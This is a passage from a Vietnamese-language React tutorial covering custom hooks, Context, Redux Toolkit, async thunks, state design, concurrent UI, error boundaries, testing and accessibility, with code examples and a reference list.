**Ví dụ thực tế hơn — `useFetch` gom logic gọi API:**

```jsx
function useFetch(url) {
  const [state, dispatch] = useReducer(
    (s, a) => ({ ...s, ...a }),
    { data: null, isLoading: true, error: null }
  );

  useEffect(() => {
    let cancelled = false;
    dispatch({ isLoading: true, error: null });

    fetch(url)
      .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      })
      .then(data => {
        if (!data || typeof data !== 'object') throw new Error('Dữ liệu trả về không đúng cấu trúc mong đợi');
        if (!cancelled) dispatch({ data, isLoading: false });
      })
      .catch(error => { if (!cancelled) dispatch({ error, isLoading: false }); });

    return () => { cancelled = true; };
  }, [url]);

  return state;
}

// Dùng ở bất kỳ component nào cần fetch:
function UserProfile({ userId }) {
  const { data, isLoading, error } = useFetch(`/api/users/${userId}`);

  if (isLoading) return <p>Đang tải...</p>;
  if (error) return <p>Lỗi: {error.message}</p>;
  return <div>{data.name}</div>;
}

function PostList({ authorId }) {
  const { data, isLoading } = useFetch(`/api/posts?author=${authorId}`);
  // ...
}
```

**Quy tắc đặt tên:** custom hook **bắt buộc** phải bắt đầu bằng `use`. React dùng quy ước này để áp dụng kiểm tra luật Hooks — nếu đặt tên khác, lint sẽ không cảnh báo khi bạn gọi hook sai cách bên trong hàm đó.

---

<!-- content-id: shared-state -->
## 7. Kiến Trúc Dữ Liệu Và Quản Lý State Toàn Cục

Quản lý một biến `count` trong 1 component là chuyện nhỏ. Nhưng khi dữ liệu (ví dụ thông tin user đăng nhập) cần dùng ở nhiều component nằm rải rác trong cây UI (Navbar, Sidebar, trang Profile...), bài toán tổ chức state trở nên phức tạp hơn nhiều.

### 7.1. Lifting State Up và vấn đề Prop Drilling

Cách cơ bản nhất: đưa state lên component cha chung gần nhất, rồi truyền xuống qua props ("lifting state up").

```jsx
function App() {
  const [user, setUser] = useState(null);
  return (
    <div>
      <Navbar user={user} />
      <MainContent user={user} />
    </div>
  );
}
```

Cách này hoạt động tốt ở quy mô nhỏ. Nhưng nếu `user` cần dùng ở một component nằm **sâu 5 tầng** bên dưới `MainContent`, bạn buộc phải truyền `user` qua props ở **cả 5 tầng trung gian** — dù các component trung gian đó (`Layout`, `Section`, `Panel`...) hoàn toàn không dùng đến `user`, chúng chỉ đóng vai trò "truyền hộ". Đây gọi là **prop drilling** — code trở nên rối, và mỗi lần thêm/sửa 1 field trong `user` bạn phải sửa type/prop ở tất cả các tầng trung gian.

```jsx
// Prop drilling: Layout và Section không dùng user, chỉ "truyền hộ"
<Layout user={user}>
  <Section user={user}>
    <Panel user={user}>
      <ProfileCard user={user} /> {/* chỉ có đây mới thực sự cần user */}
    </Panel>
  </Section>
</Layout>
```

### 7.2. Context API — chia sẻ dữ liệu không qua props

`createContext` tạo một "nguồn dữ liệu chung", `Provider` bao bọc phần cây cần chia sẻ, `useContext` cho phép bất kỳ component con nào (dù nằm sâu bao nhiêu tầng) đọc trực tiếp mà không cần nhận qua props trung gian:

```jsx
const UserContext = createContext(null);

function App() {
  const [user, setUser] = useState({ name: "An" });
  return (
    <UserContext.Provider value={user}>
      <Layout>
        <Section>
          <Panel>
            <ProfileCard /> {/* không cần nhận props user nữa */}
          </Panel>
        </Section>
      </Layout>
    </UserContext.Provider>
  );
}

function ProfileCard() {
  const user = useContext(UserContext); // đọc trực tiếp, bỏ qua mọi tầng trung gian
  return <div>Xin chào, {user.name}</div>;
}
```

**Giới hạn quan trọng cần biết:** khi giá trị trong `Provider` đổi, **mọi component** đang gọi `useContext` với context đó sẽ re-render — kể cả những component chỉ dùng một phần nhỏ của dữ liệu không hề đổi. Ví dụ nếu `UserContext` chứa cả `{ name, theme, notifications }` và chỉ `notifications` đổi liên tục (do có tin nhắn mới mỗi giây), thì mọi component chỉ hiển thị `name` (vốn không đổi) vẫn bị ép re-render theo. Vì vậy Context phù hợp với dữ liệu **ít thay đổi** (theme, ngôn ngữ, thông tin đăng nhập), không phù hợp với dữ liệu cập nhật liên tục.

### 7.3. Redux và Redux Toolkit — khi Context không còn đủ

Khi ứng dụng có nhiều luồng dữ liệu phức tạp, nhiều nơi cùng cần sửa state theo các quy tắc rõ ràng, Redux cung cấp một kiến trúc chặt chẽ hơn: toàn bộ state nằm trong **một store duy nhất**, mọi thay đổi phải đi qua **action** → được xử lý bởi **reducer** → sinh ra state mới. Không có chuyện "sửa trực tiếp state ở bất kỳ đâu" như với biến thường.

**Ví dụ cụ thể về vấn đề mà Redux giải quyết — giỏ hàng (cart) trong app thương mại điện tử**

Giả sử `cart` cần được đọc và sửa từ nhiều nơi khác nhau trong app: `ProductCard` (nút "Thêm vào giỏ"), `Navbar` (icon giỏ hàng hiện số lượng), `CartPage` (danh sách + nút xóa), `CheckoutSummary` (tính tổng tiền). Nếu chỉ dùng Context với state để tự do sửa (không có quy tắc ràng buộc):

```jsx
const CartContext = createContext(null);

function ProductCard({ product }) {
  const { cart, setCart } = useContext(CartContext);

  const addToCart = () => {
    // Component A tự ý sửa state theo cách của riêng nó
    setCart([...cart, product]);
  };
  return <button onClick={addToCart}>Thêm vào giỏ</button>;
}

function CartPage() {
  const { cart, setCart } = useContext(CartContext);

  const removeItem = (id) => {
    // Component B lại tự sửa theo MỘT LOGIC KHÁC
    setCart(cart.filter(item => item.id !== id));
  };

  const applyDiscount = () => {
    // Component C sửa trực tiếp field bên trong từng item — quên clone đúng cách
    cart.forEach(item => { item.price = item.price * 0.9; }); // MUTATE TRỰC TIẾP!
    setCart(cart); // React có thể KHÔNG re-render vì reference của cart không đổi
  };

  return <div>{/* ... */}</div>;
}
```

**Vấn đề cụ thể xảy ra trong thực tế với cách làm này:**

1. **Mỗi nơi tự viết một cách sửa `cart` riêng**, không ai đảm bảo các cách đó nhất quán với nhau. `ProductCard` thêm bằng spread `[...cart, product]` (đúng), nhưng `applyDiscount` trong `CartPage` lại lỡ tay mutate trực tiếp từng `item.price` — React không phát hiện ra sự thay đổi (vì reference mảng `cart` không đổi), nên UI **không re-render**, hiển thị giá cũ dù dữ liệu bên trong đã đổi. Đây là loại bug rất khó tìm vì code "trông như chạy đúng logic".
2. **Không có nơi nào ghi lại "chuyện gì vừa xảy ra".** Khi tổng tiền ở `CheckoutSummary` sai, bạn phải dò từng component có quyền sửa `cart` (ở ví dụ này là 3 nơi, thực tế có thể là 15-20 nơi) để tìm xem ai đã sửa sai — không có lịch sử, không có cách nào "tua lại" để xem state đã đổi qua từng bước ra sao.
3. **Không thể chèn logic chung dễ dàng.** Nếu sau này bạn muốn: mỗi lần giỏ hàng đổi thì tự động lưu vào `localStorage`, hoặc log lại để phân tích hành vi người dùng — bạn phải sửa **ở tất cả các nơi** đang gọi `setCart`, dễ sót.

**Redux giải quyết bằng cách ép buộc: muốn sửa `cart`, chỉ có một cửa duy nhất — dispatch action, reducer xử lý:**

```jsx
// cartSlice.js
import { createSlice } from '@reduxjs/toolkit';

const cartSlice = createSlice({
  name: 'cart',
  initialState: { items: [] },
  reducers: {
    addItem(state, action) {
      state.items.push(action.payload); // Immer tự đảm bảo immutable phía sau
    },
    removeItem(state, action) {
      state.items = state.items.filter(item => item.id !== action.payload);
    },
    applyDiscount(state, action) {
      // CHỈ CÓ MỘT NƠI DUY NHẤT được phép sửa giá — không ai khác có thể tự ý mutate
      state.items.forEach(item => { item.price *= (1 - action.payload); });
    },
  },
});

export const { addItem, removeItem, applyDiscount } = cartSlice.actions;
export default cartSlice.reducer;
```

```jsx
// Ở bất kỳ component nào — chỉ được YÊU CẦU thay đổi qua dispatch, không tự sửa
function ProductCard({ product }) {
  const dispatch = useDispatch();
  return <button onClick={() => dispatch(addItem(product))}>Thêm vào giỏ</button>;
}

function CartPage() {
  const dispatch = useDispatch();
  const items = useSelector(state => state.cart.items); // chỉ ĐỌC, không sửa trực tiếp
  return (
    <div>
      {items.map(item => (
        <div key={item.id}>
          {item.name} — {item.price}
          <button onClick={() => dispatch(removeItem(item.id))}>Xóa</button>
        </div>
      ))}
    </div>
  );
}
```

**Vì sao cách này giải quyết đúng 3 vấn đề nêu trên:**

1. **Mọi thay đổi đều đi qua đúng một hàm `reducer`** — không component nào có thể tự ý mutate `cart` theo cách riêng của nó (component chỉ có quyền `dispatch`, không có quyền sửa state trực tiếp), nên logic sửa giá luôn nhất quán ở một chỗ.
2. **Có lịch sử đầy đủ để debug.** Mở Redux DevTools, bạn thấy được chính xác chuỗi action đã xảy ra theo thời gian (`addItem` → `addItem` → `applyDiscount` → `removeItem`...) và state tương ứng sau mỗi bước — thay vì phải đoán mò xem component nào đã sửa sai.
3. **Dễ chèn logic chung ở một điểm.** Muốn tự động lưu `localStorage` mỗi khi `cart` đổi, bạn chỉ cần thêm 1 middleware lắng nghe mọi action liên quan đến `cart`, không cần sửa lại từng component đang gọi `dispatch`.

**Redux Toolkit (RTK)** là bản viết gọn, chuẩn hóa của Redux truyền thống. Để thấy rõ "gọn hơn" cụ thể là gọn ở đâu, hãy viết **cùng một ví dụ giỏ hàng ở trên** bằng cả 2 cách, đặt cạnh nhau so sánh.

**Cách 1 — Redux truyền thống (không dùng RTK):**

```jsx
// actionTypes.js — phải tự định nghĩa từng loại action bằng tay
const ADD_ITEM = 'cart/ADD_ITEM';
const REMOVE_ITEM = 'cart/REMOVE_ITEM';
const APPLY_DISCOUNT = 'cart/APPLY_DISCOUNT';

// actions.js — phải tự viết từng action creator bằng tay
export const addItem = (product) => ({ type: ADD_ITEM, payload: product });
export const removeItem = (id) => ({ type: REMOVE_ITEM, payload: id });
export const applyDiscount = (percent) => ({ type: APPLY_DISCOUNT, payload: percent });

// cartReducer.js — PHẢI tự tay viết immutable update, Redux gốc KHÔNG tự làm giúp
function cartReducer(state = { items: [] }, action) {
  switch (action.type) {
    case ADD_ITEM:
      return { ...state, items: [...state.items, action.payload] };
    case REMOVE_ITEM:
      return {
        ...state,
        items: state.items.filter(item => item.id !== action.payload)
      };
    case APPLY_DISCOUNT:
      // Không được viết item.price *= ... như RTK — phải tự spread từng item
      return {
        ...state,
        items: state.items.map(item => ({
          ...item,
          price: item.price * (1 - action.payload)
        }))
      };
    default:
      return state;
  }
}

export default cartReducer;
```

```jsx
// store.js
import { createStore } from 'redux';
import cartReducer from './cartReducer';

const store = createStore(cartReducer);
```

Đếm thử: **3 file, ~35 dòng**, chỉ để định nghĩa 3 action đơn giản cho `cart`. Đặc biệt ở nhánh `APPLY_DISCOUNT`, bạn buộc phải tự tay spread (`{ ...item, price: ... }`) cho **từng item trong mảng** — quên spread đúng 1 chỗ (ví dụ lỡ viết `item.price = ...` trực tiếp như ví dụ lỗi ở phần "trước Redux") là lại quay về đúng bug ban đầu mà Redux vốn muốn ngăn chặn.

**Cách 2 — Redux Toolkit (RTK), cùng đúng logic đó:**

```jsx
// cartSlice.js
import { createSlice } from '@reduxjs/toolkit';

const cartSlice = createSlice({
  name: 'cart',
  initialState: { items: [] },
  reducers: {
    addItem(state, action) {
      state.items.push(action.payload); // không cần spread — Immer tự lo
    },
    removeItem(state, action) {
      state.items = state.items.filter(item => item.id !== action.payload);
    },
    applyDiscount(state, action) {
      // Viết như mutate trực tiếp, nhưng vẫn AN TOÀN nhờ Immer phía sau
      state.items.forEach(item => { item.price *= (1 - action.payload); });
    },
  },
});

export const { addItem, removeItem, applyDiscount } = cartSlice.actions;
export default cartSlice.reducer;
```

```jsx
// store.js
import { configureStore } from '@reduxjs/toolkit';
import cartReducer from './cartSlice';

export const store = configureStore({
  reducer: { cart: cartReducer },
});
```

**So sánh trực tiếp 2 cách viết cùng một logic:**

| Tiêu chí | Redux truyền thống | Redux Toolkit |
|---|---|---|
| Số file cần tách riêng | 3 (action types, action creators, reducer) | 1 (`createSlice` gom cả 3) |
| Định nghĩa action type | Phải tự đặt hằng số string (`'cart/ADD_ITEM'`) | Tự sinh từ `name` + tên method, không cần khai báo tay |
| Viết action creator | Phải tự viết hàm trả về `{ type, payload }` | Tự sinh từ tên method trong `reducers` |
| Cập nhật state lồng nhau (`applyDiscount`) | Phải tự spread thủ công từng cấp, dễ sai sót | Viết như mutate trực tiếp, Immer tự đảm bảo immutable |
| Cấu hình store | `createStore(reducer)` | `configureStore({ reducer })`, kèm sẵn Redux DevTools và một số middleware mặc định |

**Điểm quan trọng cần hiểu đúng ở bản RTK:** dòng `state.items.push(...)` hay `item.price *= ...` trông như đang mutate (sửa trực tiếp) state — điều mà Redux gốc vốn cấm kỵ (đúng như bug ở ví dụ "trước Redux" phần 7.3 phía trên). Nhưng RTK dùng thư viện **Immer** ở phía sau: nó cho phép bạn *viết* code như đang mutate trực tiếp (dễ đọc, ít lỗi thao tác spread sai cấp), nhưng Immer sẽ tự động tạo ra một **bản sao mới immutable** phía sau hậu trường — bạn được lợi cả về cú pháp gọn lẫn tính đúng đắn, mà không cần tự nhớ quy tắc "luôn spread" như bản Redux truyền thống.

<!-- content-id: async-thunk-race -->
### 7.4. `createAsyncThunk` — xử lý bất đồng bộ với Redux

Gọi API trong Redux cần xử lý 3 trạng thái: đang tải, thành công, thất bại. `createAsyncThunk` tự động sinh ra 3 action tương ứng (`pending`, `fulfilled`, `rejected`) để bạn xử lý trong `extraReducers`:

```jsx
// authSlice.js
import { createSlice, createAsyncThunk } from '@reduxjs/toolkit';

// Định nghĩa thunk — chỉ cần viết logic async, RTK tự lo 3 action states
export const fetchUser = createAsyncThunk(
  'auth/fetchUser',          // tên action (dùng để debug)
  async (id) => {
    const res = await fetch(`/api/users/${id}`);
    if (!res.ok) throw new Error('Fetch failed'); // RTK tự bắt lỗi → rejected
    return res.json();       // giá trị trả về → payload của fulfilled
  }
);

const authSlice = createSlice({
  name: 'auth',
  initialState: { user: null, isLoading: false, error: null, currentRequestId: null },
  reducers: {},
  extraReducers: (builder) => {
    builder
      .addCase(fetchUser.pending, (state, action) => {
        state.isLoading = true;
        state.error = null;
        state.currentRequestId = action.meta.requestId;
      })
      .addCase(fetchUser.fulfilled, (state, action) => {
        if (state.currentRequestId !== action.meta.requestId) return;
        state.isLoading = false;
        state.user = action.payload;
        state.currentRequestId = null;
      })
      .addCase(fetchUser.rejected, (state, action) => {
        if (state.currentRequestId !== action.meta.requestId) return;
        state.isLoading = false;
        state.error = action.error.message;
        state.currentRequestId = null;
      });
  },
});

export default authSlice.reducer;
```

```jsx
// Dùng trong component — giống dispatch action thông thường
function UserPage({ userId }) {
  const dispatch = useDispatch();
  const { user, isLoading, error } = useSelector(state => state.auth);

  useEffect(() => {
    dispatch(fetchUser(userId));
  }, [dispatch, userId]);

  if (isLoading) return <p>Đang tải...</p>;
  if (error) return <p>Lỗi: {error}</p>;
  return <div>{user?.name}</div>;
}
```

So sánh với cách tự quản lý `isLoading`/`error` bằng `useState` rời rạc (phần 6.2): `createAsyncThunk` chuẩn hóa vòng đời `pending`/`fulfilled`/`rejected` trong `extraReducers`. Component vẫn quyết định lúc dispatch; với request có thể chồng chéo, reducer cần dùng `requestId` (như ví dụ trên), khóa cache hoặc cancellation để response cũ không ghi đè response mới.

---

### 7.5. Khi nào dùng gì: useState vs useReducer vs Context vs Redux

```
Mức độ phức tạp     Công cụ phù hợp        Dấu hiệu nhận biết
─────────────────────────────────────────────────────────────────────
Đơn giản          → useState              State độc lập, 1-2 giá trị,
                                           chỉ dùng trong 1 component

Phức tạp vừa      → useReducer            State có nhiều nhánh logic
                                           liên quan (loading/error/data),
                                           nhiều action trên cùng 1 state

Chia sẻ qua cây   → Context API           Dữ liệu ít đổi (theme, locale,
                                           user đăng nhập), cần đọc ở
                                           nhiều component không liên quan

Phức tạp, nhiều   → Redux Toolkit         Nhiều slice state độc lập,
luồng dữ liệu                             nhiều nơi đọc + ghi cùng lúc,
                                           cần debug lịch sử thay đổi
```

---


<!-- content-id: state-design -->
## 8. Thiết Kế State, Form Và Dữ Liệu Server

### 8.1. Chọn nơi ở cho state bằng câu hỏi

Trước khi chọn `useState`, Context hay store, trả lời bốn câu hỏi:

| Câu hỏi | Hướng đi |
|---|---|
| Giá trị có suy ra được từ props/state khác không? | Tính khi render, không tạo state dư thừa. |
| Chỉ một component dùng nó không? | Local state gần nơi tương tác. |
| URL có cần lưu/chia sẻ/khôi phục nó không? | Đưa một representation ổn định vào URL. |
| Đây là dữ liệu từ server có cache, stale, retry không? | Xem như server state; thiết kế key, cache và invalidation. |

Ví dụ ở Explorer: `currentChapterId` là URL state; kết quả tìm kiếm suy ra từ `query + index`; trạng thái menu mobile là local UI state; nội dung tải từ API là server state. Không có thư viện nào là “bậc tiếp theo” bắt buộc của `useState`.

### 8.2. Controlled và uncontrolled form

Input controlled nhận `value` từ React state và báo thay đổi qua `onChange`. Cách này dễ đồng bộ validation, preview và nhiều input với nhau.

```jsx
function EmailField() {
  const [email, setEmail] = useState('');
  const valid = email.includes('@'); // giá trị suy ra, không cần state riêng

  return (
    <label>
      Email
      <input value={email} onChange={event => setEmail(event.target.value)} />
      {!valid && email && <span role="alert">Email chưa hợp lệ</span>}
    </label>
  );
}
```

Input uncontrolled để DOM giữ giá trị (`defaultValue`, `ref`) thường hợp lý khi tích hợp form cũ hoặc chỉ cần đọc giá trị lúc submit. “Controlled” và “uncontrolled” là mô tả thiết kế, không phải hai cấp độ tốt/xấu.

### 8.3. Server state không chỉ là `useEffect`

Một request có thể có loading, HTTP error, dữ liệu sai cấu trúc, retry, cache, invalidation và race. Với ứng dụng nhỏ, bạn có thể quản lý rõ các trạng thái này bằng hook; khi nhu cầu cache/subscription tăng, dùng công cụ server-state phù hợp. Đừng sao chép kết quả fetch sang nhiều state cục bộ nếu chưa có lý do.

Checklist cho một resource:

1. Key nào nhận diện dữ liệu? Ví dụ `['user', userId]`.
2. Response cũ có được phép ghi đè key hiện tại không?
3. Khi nào dữ liệu stale và khi nào cần invalidation?
4. UI nào hiển thị loading, empty, error và retry?

<!-- content-id: concurrent-ui -->
## 9. Concurrent UI, Suspense Và Ranh Giới Lỗi

### 9.1. Urgent update và transition

Không đưa giá trị điều khiển input vào transition: người dùng cần thấy ký tự ngay. Nhưng danh sách kết quả tốn kém có thể cập nhật ở ưu tiên thấp hơn.

```jsx
function SearchPage({ items }) {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();
  const [filter, setFilter] = useState('');

  function handleChange(event) {
    const next = event.target.value;
    setQuery(next); // urgent: input phản hồi ngay
    startTransition(() => setFilter(next)); // non-urgent: danh sách theo kịp sau
  }

  const visible = items.filter(item => item.name.includes(filter));
  return <><input value={query} onChange={handleChange} />{isPending && <span>Đang lọc…</span>}<Results items={visible} /></>;
}
```

`useDeferredValue` phù hợp khi bạn nhận một value từ props/hook và muốn phần UI nặng dùng phiên bản chậm hơn. Cả hai API là công cụ trải nghiệm; chúng không sửa một vòng lặp JavaScript nặng đang chặn main thread.

### 9.2. Suspense có phạm vi cụ thể

`<Suspense fallback={...}>` hiện fallback khi một child thực sự suspend, ví dụ component `lazy` hoặc Promise được đọc qua cơ chế hỗ trợ Suspense. Fetch nằm trong `useEffect` **không tự kích hoạt Suspense**.

```jsx
<Suspense fallback={<ProductListSkeleton />}>
  <LazyProductList />
</Suspense>
```

Đặt boundary gần phần có thể chậm để không thay toàn bộ trang bằng spinner. Kết hợp transition để giữ nội dung đã hiện khi cập nhật không khẩn cấp suspend lại.

### 9.3. Error Boundary và retry

Error Boundary hiển thị fallback cho lỗi render ở cây con. Nó không thay thế `try/catch` cho event handler hay xử lý lỗi request trong Effect.

```jsx
class ErrorBoundary extends React.Component {
  state = { error: null };
  static getDerivedStateFromError(error) { return { error }; }
  render() {
    if (this.state.error) return <button onClick={() => this.setState({ error: null })}>Thử lại phần này</button>;
    return this.props.children;
  }
}
```

Mỗi màn hình cần quyết định boundary đặt ở đâu, fallback có giữ context nào và thao tác retry có tạo request/key mới hay không.

<!-- content-id: quality-tooling -->
## 10. Chất Lượng: Test, Accessibility Và Tooling

### 10.1. Test hành vi người dùng

Test nên kiểm tra điều người dùng thấy/làm thay vì chi tiết implementation. Với React Testing Library, render component, tương tác qua role/label, rồi kiểm tra kết quả nhìn thấy.

```jsx
render(<EmailField />);
await user.type(screen.getByRole('textbox', { name: /email/i }), 'a@b.dev');
expect(screen.queryByRole('alert')).not.toBeInTheDocument();
```

Tối thiểu có test cho: state chuyển đúng, request loading/error/success, race không ghi đè UI mới, cleanup timer/listener, và route/link mục nhỏ.

### 10.2. Accessibility là một phần của thiết kế

Ưu tiên HTML semantic, label thật cho input, focus nhìn thấy được, thao tác hoàn toàn bằng bàn phím, màu không là kênh thông tin duy nhất và thông báo thay đổi quan trọng bằng text/ARIA phù hợp. Kiểm tra tự động bằng axe hữu ích, nhưng không thay thế thử bàn phím và screen reader.

### 10.3. Profiler, TypeScript và Compiler

Chỉ tối ưu sau khi đo bằng React DevTools Profiler hoặc browser Performance. TypeScript mô tả contract của props/data; nó không thay test runtime cho response API. React Compiler là công cụ tối ưu tự động khi cấu hình hỗ trợ, không biến `useMemo`/`useCallback` thành điều kiện đúng đắn của logic.

### 10.4. React lab — phòng lab cô lập

Phòng lab ở dưới chạy React thật trong iframe sandbox, tách riêng khỏi mô hình giải thích. Nó chia thành **ba bài độc lập**: mỗi bài có một mục tiêu, thao tác cần làm và kết luận ngay bên cạnh kết quả. Bắt đầu ở Bài 1, không cần đoán thứ tự nút bấm. Nó cần mạng để tải React 19.2 từ CDN; kết quả quan sát được là bài kiểm chứng, không phải benchmark.

<!-- content-id: knowledge-map -->
## Tổng Kết — Bản Đồ Kiến Thức

### Bạn đã đi qua những gì

```
0. JavaScript nền tảng → snapshot render, closure, async và bất biến
1. Bối cảnh           → vì sao React tách dữ liệu, UI và DOM
2. Triết lý           → declarative, component, one-way data flow
3. JSX & an toàn      → JSX thành React element; dữ liệu được escape mặc định
4. Render & commit    → reconciliation, key, Fiber và identity
5. Vòng đời           → mount, update, cleanup và Strict Mode
6. Hooks              → state, reducer, effect, ref, memo, custom hook
7. State chia sẻ      → lifting state, Context, Redux Toolkit và async thunk
8. State & dữ liệu    → form, URL state, server state, cache và race condition
9. UI đồng thời       → transition, deferred value, Suspense, error boundary
10. Chất lượng        → kiểm thử hành vi, accessibility, DevTools và TypeScript
```

### Mối liên hệ cốt lõi

```
UI = f(state)                    ← triết lý nền tảng (chương 2)
     │
     ├─ state thay đổi           ← useState / useReducer (chương 6)
     │   └─ React tính UI kế tiếp ← Render (chương 4)
     │       └─ Commit nếu cần     ← Reconciliation (chương 4)
     │
     ├─ side effect              ← useEffect (chương 6)
     │   └─ gọi API, event...    ← cleanup / stale closure
     │
     └─ state chia sẻ           ← Context / Redux (chương 7)
         └─ không prop drilling
```

### Bước tiếp theo

Sau khi nắm vững nền tảng ở tài liệu này, các chủ đề nên học tiếp theo:

| Chủ đề | Lý do |
|--------|-------|
| **React Router** | Điều hướng SPA — gần như mọi app thực tế đều cần |
| **React Query / SWR** | Thay thế `useEffect` + `useState` khi fetch data — giải quyết caching, refetch, stale data |
| **Next.js** | SSR, SSG, file-based routing, API routes — chuẩn mực cho app production |
| **TypeScript + React** | Type safety cho props, state, hooks — bắt buộc trong team/dự án thực |
| **Testing (React Testing Library)** | Viết test cho component theo hành vi người dùng |
| **Performance profiling** | React DevTools Profiler, Lighthouse — đo và tối ưu thực tế |

### Nguồn tham khảo chính

Các khẳng định về API React trong tài liệu nên được đối chiếu với tài liệu chính thức, vì chi tiết triển khai và khuyến nghị có thể thay đổi theo phiên bản:

- [React — Render and Commit](https://react.dev/learn/render-and-commit), [Preserving and Resetting State](https://react.dev/learn/preserving-and-resetting-state), [Rendering Lists](https://react.dev/learn/rendering-lists).
- [React — State as a Snapshot](https://react.dev/learn/state-as-a-snapshot), [Queueing a Series of State Updates](https://react.dev/learn/queueing-a-series-of-state-updates), [useEffect](https://react.dev/reference/react/useEffect), [useRef](https://react.dev/reference/react/useRef).
- [React — memo](https://react.dev/reference/react/memo), [useMemo](https://react.dev/reference/react/useMemo), [Sharing State Between Components](https://react.dev/learn/sharing-state-between-components).
- [Redux Toolkit — createAsyncThunk](https://redux-toolkit.js.org/api/createAsyncThunk), [WHATWG — Dynamic markup insertion](https://html.spec.whatwg.org/multipage/dynamic-markup-insertion.html), [web.dev — Rendering performance](https://web.dev/articles/rendering-performance).
- [React — Choosing the State Structure](https://react.dev/learn/choosing-the-state-structure), [Managing State](https://react.dev/learn/managing-state), [Synchronizing with Effects](https://react.dev/learn/synchronizing-with-effects).
- [React — useTransition](https://react.dev/reference/react/useTransition), [useDeferredValue](https://react.dev/reference/react/useDeferredValue), [Suspense](https://react.dev/reference/react/Suspense), [React Developer Tools](https://react.dev/learn/react-developer-tools).
